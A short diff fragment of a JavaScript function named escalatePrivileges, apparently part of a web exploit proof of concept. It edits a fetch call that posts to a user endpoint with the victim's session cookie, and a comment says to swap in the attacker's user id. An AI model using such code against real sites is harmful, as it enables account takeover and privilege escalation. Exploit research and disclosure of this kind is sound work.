@@ -32,7 +32,7 @@ async function escalatePrivileges() {
     });
 
     // Replace target user id with attacker id, the id was 5 in my case
-    await fetch(`/users/5`, {
+    await fetch(`/users/6`, {
         method: "POST",
         credentials: "include", // send session cookie
         headers: {
